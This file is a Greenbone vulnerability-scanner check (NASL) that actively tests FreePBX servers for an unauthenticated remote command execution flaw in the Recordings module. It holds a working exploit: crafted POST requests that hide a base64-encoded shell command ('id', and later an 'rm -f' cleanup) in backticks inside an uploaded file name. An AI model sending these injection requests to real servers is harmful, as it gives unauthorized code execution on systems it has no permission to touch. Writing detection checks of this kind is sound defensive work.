# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freepbx:freepbx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105874");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2016-08-17 16:55:21 +0200 (Wed, 17 Aug 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("FreePBX RCE Vulnerability (Aug 2016) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_freepbx_http_detect.nasl");
  script_mandatory_keys("freepbx/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"A remote command execution (RCE) vulnerability that results in
  privileged escalation exists in FreePBX 13 and FreePBX 14 with `Recordings' versions between
  13.0.12 and 13.0.26.");

  script_tag(name:"vuldetect", value:"Sends two special crafted HTTP POST requests and checks the
  responses.");

  script_tag(name:"insight", value:"The recordings module lets you playback recorded files. Due to
  a coding error, certain Ajax requests were unauthenticated when requesting files. This allowed
  shell execution and privileged escalation if triggered correctly.");

  script_tag(name:"affected", value:"FreePBX with System Recordings Module versions 13.0.1beta1
  through 13.0.26.");

  script_tag(name:"solution", value:"Update the Recordings module to version 13.0.27 or later.");

  script_xref(name:"URL", value:"https://www.freepbx.org/security-vulnerability-notice-2/");
  script_xref(name:"URL", value:"https://wiki.freepbx.org/display/FOP/2016-08-09+CVE+Remote+Command+Execution+with+Privileged+Escalation");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

function _run( file, port, vtstrings ) {
  local_var file, port, vtstrings;
  local_var post_data, req, buf, fs, rep_file;

  post_data = string('\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="extension"\r\n\r\n',
  '0\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="language"\r\n\r\n',
  'de\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="filename"\r\n\r\n',
  file, '\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="systemrecording"\r\n\r\n\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="id"\r\n\r\n',
  '1\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="name"\r\n\r\n',
  'aaaa\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="file"; filename="', vtstrings["default"], '"\r\n',
  'Content-Type: audio/mpeg\r\n\r\n',
  vtstrings["default"], ' Test for https://www.exploit-db.com/exploits/40232/\r\n',
  '------------', vtstrings["default"], '--');

  req = http_post_put_req( port:port,
                           url:'/admin/ajax.php?module=recordings&command=savebrowserrecording',
                           data:post_data,
                           add_headers:make_array("Content-Type", "multipart/form-data; boundary=----------" + vtstrings["default"]),
                           referer_url:"/" );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf !~ "HTTP/1\.. 200" || 'status":true' >!< buf || 'filename"' >!< buf )
    return;

  fs = eregmatch( pattern:'_fs-([0-9]+[^.]+).wav', string:buf );
  if( isnull( fs[1] ) )
    return;

  rep_file = file + '-' + fs[1]  + '.wav';

  post_data = 'file=' + rep_file + '&name=a&codec=gsm&lang=ru&temporary=1&command=convert&module=recordings';

  req = http_post_put_req( port:port,
                           url:'/admin/ajax.php',
                           data:post_data,
                           add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                           referer_url:"/" );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  return buf;
}

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

vtstrings = get_vt_strings();

file = '_' + vtstrings["lowercase"] + '_`echo aWQK | base64 -d | sh`_fs';
buf = _run( file:file, port:port, vtstrings:vtstrings );
if( ! buf )
  exit( 0 );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
  del = eregmatch( pattern:"open input file `(\\/[^_]+/)_" + vtstrings["lowercase"] + "_", string:buf );
  if( ! isnull( del[1] ) )
    d = str_replace( string:del[1], find:"\", replace:"");

  if( d && strlen( d ) > 1 && d[0] == "/" ) {
    file = 'rm -f ' + d + '_' + vtstrings["lowercase"] + '_*_fs-*.wav';
    file = '_' + vtstrings["lowercase"] + '_' + '`echo ' + base64( str:file ) + ' | base64 -d | sh`_fs';
    t = _run( file:file, port:port, vtstrings:vtstrings );
  }

  res = buf;
  r = eregmatch( pattern:'(uid=[0-9]+.*gid=[0-9]+[^_]+)', string:buf );
  if( ! isnull( r[1] ) )
    res = r[1];

  report = 'It was possible to execute the "id" command on the remote host.\n\nResult:\n\n' + res + '\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
